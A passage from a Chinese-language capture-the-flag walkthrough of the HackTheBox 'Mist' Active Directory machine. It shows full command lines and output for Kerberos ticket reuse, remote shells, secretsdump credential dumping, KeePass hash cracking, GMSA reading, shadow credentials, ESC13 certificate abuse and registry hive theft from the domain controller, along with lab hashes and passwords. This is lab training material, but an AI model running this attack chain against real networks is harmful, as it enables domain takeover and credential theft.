ZZZfD5gZ1T/68RfUPQaANauAN8TlYeL7eCijOixjsx2ki23oMBtZExtsdWbfSX5uXfdC3BRRGDnkY6xjR2o7doahCWFRzInKJPcnCnhG3pZxsB7Z+gyZ4t/OJUuOzUMnOLd7Qpoik8CQ1pJnZeIGnsYgezhr1mmtfwKNU8JlzN3Kq3mJ8MSr/Vgic9flJOTEKESmxoxoIrSW7oga7OXJgtg2p5VBu6GyDOU1xQSKsw1Z6bburMJaazat5ePYNsnr9IjF3PDkcTosAjWj6G3yvQobfzxkwM93LCT7UfJ64LnQCTH8Tn6U+0vPsAlF0aTfAennXJ4kGX9HHTyRLbzy1jMhMMiMDecWPNd11liXUwcUDMeU0LFHKOB4jCB36ADAgEAooHXBIHUfYHRMIHOoIHLMIHIMIHFoCswKaADAgESoSIEIN8yEmDIKMdg3mTeWZPXrVApto9w4qBtnkZ7DPBkCmrOoQobCE1JU1QuSFRCohowGKADAgEKoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAAKEAAKURGA8yMDI0MTAyNzA3MjIxNVqmERgPMjAyNDEwMjcxNzE4MTBapxEYDzIwMjQxMTAzMDcxODEwWqgKGwhNSVNULkhUQqkgMB6gAwIBAaEXMBUbBGNpc2YbDW1zMDEubWlzdC5odGI=
```

要在Linux主机上使用这个票据，需要对它进行转换。将把base64字符串保存到一个文件中，并对其进行解码。然后使用ticketConverter.py（来自[Impacket](https://github.com/SecureAuthCorp/impacket)）将其转换为CCACHE格式：

``` bash
root@kali:~/hackthebox/machine/mist
> base64 -d administrator.kirbi.b64 > administrator.kirbi
root@kali:~/hackthebox/machine/mist
> ticketConverter.py administrator.kirbi administrator.ccache
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] converting kirbi to ccache...
[+] done
```

#### shell

``` bash
root@kali:~/hackthebox/machine/mist
> KRB5CCNAME=administrator.ccache proxychains -q wmiexec.py administrator@ms01.mist.htb -k -no-pass
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
mist\administrator

C:\>cd C:\users\administrator\desktop
C:\users\administrator\desktop>type user.txt
4806854ad731db81dfdc5cb13d138120
```

#### secretsdump

``` bash
mist % KRB5CCNAME=administrator.ccache proxychains -q secretsdump.py administrator@ms01.mist.htb -k -no-pass
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xe3a142f26a6e42446aa8a55e39cbcd86
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:711e6a685af1c31c4029c3c7681dd97b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:90f903787dd064cc1973c3aa4ca4a7c1:::
svc_web:1000:aad3b435b51404eeaad3b435b51404ee:76a99f03b1d2656e04c39b46e16b48c8:::
[*] Dumping cached domain logon information (domain/username:hash)
MIST.HTB/Brandon.Keywarp:$DCC2$10240#Brandon.Keywarp#5f540c9ee8e4bfb80e3c732ff3e12b28: (2024-10-27 07:30:58)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
MIST\MS01$:plain_password_hex:7e580d1b9c3b6f6e86642fe757cd0b8d0b99cc99cc7b44ab5a0090f0d9df6e6aed5bcf0209b662941352c2fa84f9c67c888f82bce891c1e4c12c9dd3ba3c69dccb34e2c1ccebd6f54f5f3eae7a6ec0461c2fe65ee2aaeb42333cc339ef2f5def6a1da74eda6e6a0e58446d0ea0786186045c63fd0edb40a76f8c29ea76f987f28cd64611a3dad4bbd3926472e107d16d2c2cbe0ece843c377896901916e7289c71d06f48de21f840ec14d193176068dad898e0b133998814bbd2852e026d3ae9e313ba4bd36e6f937e7d17c7671ebf939803d439f9a908d90c3336e097c96020aafd2cfb3c93617c74e361d5942976cf
MIST\MS01$:aad3b435b51404eeaad3b435b51404ee:25231b945c930613cd0a425c85901ad4:::
[*] DPAPI_SYSTEM
dpapi_machinekey:0xe464e18478cf4a7d809dfc9f5d6b5230ce98779b
dpapi_userkey:0x579d7a06798911d322fedc960313e93a71b43cc2
[*] NL$KM
 0000   57 C8 F7 CD 24 F2 55 EB  19 1D 07 C2 15 84 21 B0   W...$.U.......!.
 0010   90 7C 79 3C D5 BE CF AC  EF 40 4F 8E 2A 76 3F 00   .|y<.....@O.*v?.
 0020   04 87 DF 47 CF D8 B7 AF  6D 5E EE 9F 16 5E 75 F3   ...G....m^...^u.
 0030   80 24 AA 24 B0 7D 3C 29  4F EA 4E 4A FB 26 4E 62   .$.$.}<)O.NJ.&Nb
NL$KM:57c8f7cd24f255eb191d07c2158421b0907c793cd5becfacef404f8e2a763f000487df47cfd8b7af6d5eee9f165e75f38024aa24b07d3c294fea4e4afb264e62
[*] _SC_ApacheHTTPServer
svc_web:MostSavagePasswordEver123
[*] Cleaning up...
[*] Stopping service RemoteRegistry
```

可以直接以管理员的身份获得shell，而无需返回到其他步骤：

``` bash
root@kali:~/hackthebox/machine/mist
> proxychains -q evil-winrm -i localhost -u administrator -H 711e6a685af1c31c4029c3c7681dd97b

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
ms01\administrator
```

#### Shell as op_Sharon.Mullard on Mist
#### Enumeration
#### Home Directories

Sharon.Mullard有一个KeePass数据库，在他们的主目录中也有一些图像：

``` bash
*Evil-WinRM* PS C:\Users\Sharon.Mullard> tree . /f
Folder PATH listing
Volume serial number is 000001AF 560D:8100
C:\USERS\SHARON.MULLARD
+---Desktop
+---Documents
¦       sharon.kdbx
¦
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
¦       cats.png
¦       image_20022024.png
¦
+---Saved Games
+---Videos
```

#### KeePass

KeePass数据库需要密码，看看两个图片文件

 - cats.png

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mist-cats.png)

 - image_20022024.png

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mist-image_20022024.png)

它显示了一个带有base64编码密码的[Cyberchef](https://gchq.github.io/CyberChef/)窗口。输入是15个字符（可以在单词"Output"上方看到），并以这14个字符开头："UA7cpa[#1!_*ZX"

#### 恢复密码
#### 破解 KeePass Master Password

使用keepass2john从数据库生成一个hash：

``` bash
mist % keepass2john sharon.kdbx | tee sharon.kdbx.hash
sharon:$keepass$*2*60000*0*ae4c58b24d564cf7e40298f973bfa929f494a285e48a70b719b280200793ee67*761ad6f646fff6f41a844961b4cc815dc4cd0d5871520815f51dd1a5972f6c55*6520725ffa21f113d82f5240f3be21b6*ce6d93ca81cb7f1918210d0752878186b9e8965adef69a2a896456680b532162*dda750ac8a3355d831f62e1e4e99970f6bfe6b7d2b6d429ed7b6aca28d3174dc
```

使用-a 3将其传递给hashcat使用掩码模式，并给它"UA7cpa[#1!_*ZX"作为密码，其中?a表示任意字符。自动检测哈希模式找到两种可能的哈希格式，这个是13400：

``` bash
hashcat --user sharon.kdbx.hash -m 13400 -a 3 'UA7cpa[#1!_*ZX?a'

UA7cpa[#1!_*ZX@
```

#### Read Password from KeePass

``` bash
mist % kpcli --kdb=sharon.kdbx
Provide the master password: *************************

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> show -f "sharon/operative account"

 Path: /sharon/
Title: operative account
Uname:
 Pass: ImTiredOfThisJob:(
  URL: https://keepass.info/
Notes: Notes
```

#### 确认user

回头看看Bloodhound，在"搜索"栏输入"Sha"会显示另一个账户：

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Mist3.png)

``` bash
mist % proxychains -q netexec smb MS01 -u op_sharon.mullard -p 'ImTiredOfThisJob:('
SMB         192.168.100.101 445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:mist.htb) (signing:False) (SMBv1:False)
SMB         192.168.100.101 445    MS01             [-] Error checking if user is admin on 192.168.100.101: The NETBIOS connection with the remote host timed out.
SMB         192.168.100.101 445    MS01             [+] mist.htb\op_sharon.mullard:ImTiredOfThisJob:(
mist % proxychains -q netexec smb DC01 -u op_sharon.mullard -p 'ImTiredOfThisJob:('
SMB         192.168.100.100 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)
SMB         192.168.100.100 445    DC01             [+] mist.htb\op_sharon.mullard:ImTiredOfThisJob:(
mist % proxychains -q netexec winrm DC01 -u op_sharon.mullard -p 'ImTiredOfThisJob:('
WINRM       192.168.100.100 5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:mist.htb)
WINRM       192.168.100.100 5985   DC01             [+] mist.htb\op_sharon.mullard:ImTiredOfThisJob:( (Pwn3d!)
```

#### Evil-WinRM

[Evil-WinRM](https://github.com/Hackplayers/evil-winrm)在proxychains上可以在DC01上获得shell：

``` bash
mist % proxychains -q evil-winrm -i DC01 -u op_sharon.mullard -p 'ImTiredOfThisJob:('

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\op_Sharon.Mullard\Documents> whoami
mist\op_sharon.mullard
```

#### Auth as svc_ca$
#### Enumeration

除了作为一个具有证书的域用户之外，op_Sharon.Mullard属于Operatives组，对该组的SVC_CA$账户具有ReadGMSAPassword权限

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Mist4.png)

#### Get Password Hash

``` bash
~/hackthebox/machine/mist proxychains -q netexec ldap DC01 -u op_sharon.mullard -p 'ImTiredOfThisJob:(' --gmsa
SMB         192.168.100.100 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)
LDAPS       192.168.100.100 636    DC01             [+] mist.htb\op_sharon.mullard:ImTiredOfThisJob:(
LDAPS       192.168.100.100 636    DC01             [*] Getting GMSA Passwords
LDAPS       192.168.100.100 636    DC01             Account: svc_ca$              NTLM: 07bb1cde74ed154fcec836bc1122bdcc

~/hackthebox/machine/mist proxychains -q netexec smb DC01 -u 'svc_ca$' -H 07bb1cde74ed154fcec836bc1122bdcc
SMB         192.168.100.100 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)
SMB         192.168.100.100 445    DC01             [+] mist.htb\svc_ca$:07bb1cde74ed154fcec836bc1122bdcc
```

#### Auth as svc_cabackup
#### Enumeration

svc_ca$帐户是证书服务组的成员，该组有另一个可以注册的证书模板，但更重要的是，它在svc_cabackup上有AddKeyCredentialLink权限：

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Mist5.png)

#### Add Shadow Credential

``` bash
~/hackthebox/machine/mist proxychains -q certipy shadow auto -username 'svc_ca$@mist.htb' -hashes :07bb1cde74ed154fcec836bc1122bdcc -account svc_cabackup
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'svc_cabackup'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'd21d6202-5d9d-d7db-8779-5b3fec4d9e11'
[*] Adding Key Credential with device ID 'd21d6202-5d9d-d7db-8779-5b3fec4d9e11' to the Key Credentials for 'svc_cabackup'
[*] Successfully added Key Credential with device ID 'd21d6202-5d9d-d7db-8779-5b3fec4d9e11' to the Key Credentials for 'svc_cabackup'
[*] Authenticating as 'svc_cabackup' with the certificate
[*] Using principal: svc_cabackup@mist.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'svc_cabackup.ccache'
[*] Trying to retrieve NT hash for 'svc_cabackup'
[*] Restoring the old Key Credentials for 'svc_cabackup'
[*] Successfully restored the old Key Credentials for 'svc_cabackup'
[*] NT hash for 'svc_cabackup': c9872f1bc10bdd522c12fc2ac9041b64

~/hackthebox/machine/mist proxychains -q netexec smb DC01 -u 'svc_cabackup' -H c9872f1bc10bdd522c12fc2ac9041b64
SMB         192.168.100.100 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)
SMB         192.168.100.100 445    DC01             [+] mist.htb\svc_cabackup:c9872f1bc10bdd522c12fc2ac9041b64
```

#### Shell as Administrator
#### ESC13 Background

在2024年2月，Spector Ops发布了一项名为[ADCS ESC13滥用技术](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53)的新研究，详细描述了另一种ADCS错误配置。这一点与具有OID组链接到AD组的保险政策的模板有关。模板有一个保险策略，该策略可以有一个指向组的链接，这样使用该证书进行身份验证的用户就可以获得一个具有该组成员资格的令牌。Spector Ops将ESC13的所需条件如下列出：

1. 主体对证书模板具有注册权限。
2. 证书模板具有颁发策略扩展。
3. 发布策略中有一个OID组链接到某个组。
4. 证书模板中没有委托人不能满足的颁发要求。
5. 证书模板定义了启用客户端认证的eku。

#### ESC13 Enumeration
#### Check-ADCSESC13.ps1

有几种方法可以检查ESC13。有一个PowerShell脚本，[Check-ADCSESC13.Ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1)就是这么设计的。上传到DC01，并运行它：

``` bash
*Evil-WinRM* PS C:\programdata> . .\Check-ADCSESC13.ps1
Enumerating OIDs
------------------------
OID 14514029.01A0D91BA39F2716F6917FF97B18C130 links to group: CN=Certificate Managers,CN=Users,DC=mist,DC=htb

OID DisplayName: 1.3.6.1.4.1.311.21.8.5839708.6945465.11485352.4768789.12323346.226.6538420.14514029
OID DistinguishedName: CN=14514029.01A0D91BA39F2716F6917FF97B18C130,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=mist,DC=htb
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.5839708.6945465.11485352.4768789.12323346.226.6538420.14514029
OID msDS-OIDToGroupLink: CN=Certificate Managers,CN=Users,DC=mist,DC=htb
------------------------
OID 979197.E044723721C6681BECDB4DDD43B151CC links to group: CN=ServiceAccounts,OU=Services,DC=mist,DC=htb

OID DisplayName: 1.3.6.1.4.1.311.21.8.5839708.6945465.11485352.4768789.12323346.226.858803.979197
OID DistinguishedName: CN=979197.E044723721C6681BECDB4DDD43B151CC,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=mist,DC=htb
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.5839708.6945465.11485352.4768789.12323346.226.858803.979197
OID msDS-OIDToGroupLink: CN=ServiceAccounts,OU=Services,DC=mist,DC=htb
------------------------
Enumerating certificate templates
------------------------
Certificate template ManagerAuthentication may be used to obtain membership of CN=Certificate Managers,CN=Users,DC=mist,DC=htb

Certificate template Name: ManagerAuthentication
OID DisplayName: 1.3.6.1.4.1.311.21.8.5839708.6945465.11485352.4768789.12323346.226.6538420.14514029
OID DistinguishedName: CN=14514029.01A0D91BA39F2716F6917FF97B18C130,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=mist,DC=htb
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.5839708.6945465.11485352.4768789.12323346.226.6538420.14514029
OID msDS-OIDToGroupLink: CN=Certificate Managers,CN=Users,DC=mist,DC=htb
------------------------
Certificate template BackupSvcAuthentication may be used to obtain membership of CN=ServiceAccounts,OU=Services,DC=mist,DC=htb

Certificate template Name: BackupSvcAuthentication
OID DisplayName: 1.3.6.1.4.1.311.21.8.5839708.6945465.11485352.4768789.12323346.226.858803.979197
OID DistinguishedName: CN=979197.E044723721C6681BECDB4DDD43B151CC,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=mist,DC=htb
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.5839708.6945465.11485352.4768789.12323346.226.858803.979197
OID msDS-OIDToGroupLink: CN=ServiceAccounts,OU=Services,DC=mist,DC=htb
------------------------
Done
```

ManagerAuthentication模板可以用来在证书管理器中获得成员资格：

``` bash
Certificate template ManagerAuthentication may be used to obtain membership of CN=Certificate Managers,CN=Users,DC=mist,DC=htb
```

另外，BackupSvcAuthentication可以用来获得ServiceAccounts中的成员资格：

``` bash
Certificate template BackupSvcAuthentication may be used to obtain membership of CN=ServiceAccounts,OU=Services,DC=mist,DC=htb
```

#### Bloodhound 预定义查询

在Bloodhound-CE中有一个预定义的查询，通过转到"Cypher"，点击文件夹图标，然后向下滚动到ADCS部分的底部，找到"Enrollment rights on CertTemplates with OIDGroupLink"，可以直观地看到这一点：

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Mist6.png)

运行它

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Mist7.png)

在这个图中有两个OIDGroupLink链接。实际缺少的是Certificate Managers组是CA Backup组的成员，而ServiceAccounts组是Backup Operators组的成员。使用Pathfinding选项卡可以很好地显示这一点：

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Mist8.png)

#### 更新Certipy

在Certipy上也有一个pull请求[Adds support for ESC13 #196](https://github.com/ly4k/Certipy/pull/196)，为ESC13添加检测逻辑。运行此版本确实找到了易受攻击的ESC13模板：

``` bash
~/hackthebox/machine/mist proxychains -q certipy find -vulnerable -u svc_cabackup -hashes :c9872f1bc10bdd522c12fc2ac9041b64 -dc-ip 192.168.100.100 -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 14 enabled certificate templates
[*] Finding issuance policies
[*] Found 1 issuance policy
[*] Found 2 OIDs linked to templates
[*] Trying to get CA configuration for 'mist-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'mist-DC01-CA' via CSRA: Can't find a valid stringBinding to connect
[*] Trying to get CA configuration for 'mist-DC01-CA' via RRP
[*] Got CA configuration for 'mist-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : mist-DC01-CA
    DNS Name                            : DC01.mist.htb
    Certificate Subject                 : CN=mist-DC01-CA, DC=mist, DC=htb
    Certificate Serial Number           : 3BF0F0DDF3306D8E463B218B7DB190F0
    Certificate Validity Start          : 2024-02-15 15:07:23+00:00
    Certificate Validity End            : 2123-02-15 15:17:23+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : MIST.HTB\Administrators
      Access Rights
        ManageCertificates              : MIST.HTB\Administrators
                                          MIST.HTB\Domain Admins
                                          MIST.HTB\Enterprise Admins
        ManageCa                        : MIST.HTB\Administrators
                                          MIST.HTB\Domain Admins
                                          MIST.HTB\Enterprise Admins
        Enroll                          : MIST.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : ManagerAuthentication
    Display Name                        : ManagerAuthentication
    Certificate Authorities             : mist-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireCommonName
                                          SubjectAltRequireUpn
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Server Authentication
                                          Encrypting File System
                                          Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 99 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Issuance Policies                   : 1.3.6.1.4.1.311.21.8.5839708.6945465.11485352.4768789.12323346.226.6538420.14514029
    Linked Groups                       : CN=Certificate Managers,CN=Users,DC=mist,DC=htb
    Permissions
      Enrollment Permissions
        Enrollment Rights               : MIST.HTB\Certificate Services
                                          MIST.HTB\Domain Admins
                                          MIST.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : MIST.HTB\Administrator
        Write Owner Principals          : MIST.HTB\Domain Admins
                                          MIST.HTB\Enterprise Admins
                                          MIST.HTB\Administrator
        Write Dacl Principals           : MIST.HTB\Domain Admins
                                          MIST.HTB\Enterprise Admins
                                          MIST.HTB\Administrator
        Write Property Principals       : MIST.HTB\Domain Admins
                                          MIST.HTB\Enterprise Admins
                                          MIST.HTB\Administrator
    [!] Vulnerabilities
      ESC13                             : 'MIST.HTB\\Certificate Services' can enroll, template allows client authentication and issuance policy is linked to group ['CN=Certificate Managers,CN=Users,DC=mist,DC=htb']
```

注意下面这一行：

``` bash
Minimum RSA Key Length              : 4096
```

#### Exploit
#### Overview

 - 使用ManagerAuthentication模板获取svc_cabackup证书，以获得对certificate Managers组的访问权。
 - 使用该证书获取Kerberos票据。
 - 使用BackupSvcAuthentication模板（现在可以作为certificate Managers的成员访问它）获取svc_cabackup证书，以获得对ServiceAccounts组的访问权。
 - 使用该证书获取Kerberos票据。
 - 使用Kerberos票据对DC01进行身份验证，并使用Backup Operators特权退出注册表组。
 - 本地secretsdump.py为DC01提取哈希值。
 - 使用管理员NTLM在DC01上获取shell。

虽然上面我使用certipy的分支来识别ESC13[Certipy ESC13](https://github.com/sploutchy/Certipy/tree/main)，但当前版本可以执行利用它所需的所有步骤。

#### 访问证书管理器组

首先使用ManagerAuthentication模板获取svc_cabackup的证书。

``` bash
~/hackthebox/machine/mist proxychains -q certipy req -u svc_cabackup -hashes :c9872f1bc10bdd522c12fc2ac9041b64 -ca mist-DC01-CA -template ManagerAuthentication -dc-ip 192.168.100.100 -dns 192.168.100.100 -key-size 4096
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 63
[*] Got certificate with UPN 'svc_cabackup@mist.htb'
[*] Certificate object SID is 'S-1-5-21-1045809509-3006658589-2426055941-1135'
[*] Saved certificate and private key to 'svc_cabackup.pfx'
```

现在，使用该证书获取Kerberos票据：

``` bash
~/hackthebox/machine/mist proxychains -q certipy auth -pfx ./svc_cabackup.pfx -kirbi -dc-ip 192.168.100.100
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: svc_cabackup@mist.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved Kirbi file to 'svc_cabackup.kirbi'
[*] Trying to retrieve NT hash for 'svc_cabackup'
[*] Got hash for 'svc_cabackup@mist.htb': aad3b435b51404eeaad3b435b51404ee:c9872f1bc10bdd522c12fc2ac9041b64
```

将该票据转换为可以在Linux上使用的缓存格式：

``` bash
~/hackthebox/machine/mist ticketConverter.py svc_cabackup.kirbi svc_cabackup.ccache
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] converting kirbi to ccache...
[+] done
```

#### 访问ServiceAccounts组

使用Kerberos 配合BackupSvcAuthentication template进行认证

``` bash
~/hackthebox/machine/mist KRB5CCNAME=svc_cabackup.ccache proxychains -q certipy req -u svc_cabackup -k -no-pass -ca mist-DC01-CA -template BackupSvcAuthentication -dc-ip 192.168.100.100 -dns 192.168.100.100 -key-size 4096 -target DC01.mist.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 64
[*] Got certificate with UPN 'svc_cabackup@mist.htb'
[*] Certificate object SID is 'S-1-5-21-1045809509-3006658589-2426055941-1135'
[*] Saved certificate and private key to 'svc_cabackup.pfx'
```

使用certipy auth来获得一张ticket。

``` bash
~/hackthebox/machine/mist proxychains -q certipy auth -pfx ./svc_cabackup.pfx -kirbi -dc-ip 192.168.100.100
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: svc_cabackup@mist.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved Kirbi file to 'svc_cabackup.kirbi'
[*] Trying to retrieve NT hash for 'svc_cabackup'
[*] Got hash for 'svc_cabackup@mist.htb': aad3b435b51404eeaad3b435b51404ee:c9872f1bc10bdd522c12fc2ac9041b64
```

ticketConverter.py转换它：

``` bash
~/hackthebox/machine/mist ticketConverter.py svc_cabackup.kirbi svc_cabackup.ccache
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] converting kirbi to ccache...
[+] done
```

#### Recover Hashes
#### Exfil Reg Hives

[Impacket](https://github.com/SecureAuthCorp/impacket)有一个reg.py示例脚本，其中有一个备份子命令，可将HKLM\SAM，HKLM\SYSTEM和HKLM\SECURITY保存到系统上的指定位置。这里的一种常用技术是将hive直接保存到我控制的SMB共享中，但是代理链上的网络连接很慢而且很挑剔，所以最好将它们保存到C:\programdata\：

``` bash
~/hackthebox/machine/mist KRB5CCNAME=svc_cabackup.ccache proxychains -q reg.py -k -no-pass mist.htb/svc_cabackup@dc01.mist.htb backup -o '\programdata'
/usr/local/bin/reg.py:195: SyntaxWarning: invalid escape sequence '\S'
  for hive in ["HKLM\SAM", "HKLM\SYSTEM", "HKLM\SECURITY"]:
/usr/local/bin/reg.py:195: SyntaxWarning: invalid escape sequence '\S'
  for hive in ["HKLM\SAM", "HKLM\SYSTEM", "HKLM\SECURITY"]:
/usr/local/bin/reg.py:195: SyntaxWarning: invalid escape sequence '\S'
  for hive in ["HKLM\SAM", "HKLM\SYSTEM", "HKLM\SECURITY"]:
/usr/local/bin/reg.py:220: SyntaxWarning: invalid escape sequence '\%'
  outputFileName = "%s\%s.save" % (self.__options.outputPath, subKey)
/usr/local/bin/reg.py:221: SyntaxWarning: invalid escape sequence '\S'
  logging.debug("Dumping %s, be patient it can take a while for large hives (e.g. HKLM\SYSTEM)" % keyName)
/usr/local/bin/reg.py:597: SyntaxWarning: invalid escape sequence '\s'
  save_parser.add_argument('-o', dest='outputPath', action='store', metavar='\\\\192.168.0.2\share', required=True, help='Output UNC path the target system must export the registry saves to')
/usr/local/bin/reg.py:600: SyntaxWarning: invalid escape sequence '\S'
  backup_parser = subparsers.add_parser('backup', help='(special command) Backs up HKLM\SAM, HKLM\SYSTEM and HKLM\SECURITY to a specified file.')
/usr/local/bin/reg.py:601: SyntaxWarning: invalid escape sequence '\s'
  backup_parser.add_argument('-o', dest='outputPath', action='store', metavar='\\\\192.168.0.2\share', required=True,
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
[*] Saved HKLM\SAM to \programdata\SAM.save
[*] Saved HKLM\SYSTEM to \programdata\SYSTEM.save
[*] Saved HKLM\SECURITY to \programdata\SECURITY.save
```

``` bash
*Evil-WinRM* PS C:\programdata> ls *.save


    Directory: C:\programdata


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/27/2024   2:04 AM          28672 SAM.save
-a----        10/27/2024   2:04 AM          36864 SECURITY.save
-a----        10/27/2024   2:04 AM       18210816 SYSTEM.save
```

然后下载这3个文件

``` bash
*Evil-WinRM* PS C:\programdata> download SAM.save

Info: Downloading C:\programdata\SAM.save to SAM.save

Info: Download successful!
*Evil-WinRM* PS C:\programdata> download SECURITY.save

Info: Downloading C:\programdata\SECURITY.save to SECURITY.save

Info: Download successful!
*Evil-WinRM* PS C:\programdata> download SYSTEM.save

Info: Downloading C:\programdata\SYSTEM.save to SYSTEM.save

Info: Download successful!
```

#### secretsdump

Secretsdump.py将从这些hives中转储hash：

``` bash
~/hackthebox/machine/mist secretsdump.py -sam SAM.save -security SECURITY.save -system SYSTEM.save local
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x47c7c97d3b39b2a20477a77d25153da5
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e121bd371bd4bbaca21175947013dd7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:c68cb851aa6312ad86b532db8103025cb80e69025bd381860316ba55b056b9e1248e7817ab7fc5b23c232a5bd2aa5b8515041dc3dc47fa4e2d4c34c7db403c7edc4418cf22a1b8c2c544c464ec9fedefb1dcdbebff68c6e9a103f67f3032b68e7770b4e8e22ef05b29d002cc0e22ad4873a11ce9bac40785dcc566d38bb3e2f0d825d2f4011b566ccefdc55f098c3b76affb9a73c6212f69002655dd7b774673bf8eecaccd517e9550d88e33677ceba96f4bc273e4999bbd518673343c0a15804c43fde897c9bd579830258b630897e79d93d0c22edc2f933c7ec22c49514a2edabd5d546346ce55a0833fc2d8403780
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:e768c4cf883a87ba9e96278990292260
[*] DPAPI_SYSTEM
dpapi_machinekey:0xc78bf46f3d899c3922815140240178912cb2eb59
dpapi_userkey:0xc62a01b328674180712ffa554dd33d468d3ad7b8
[*] NL$KM
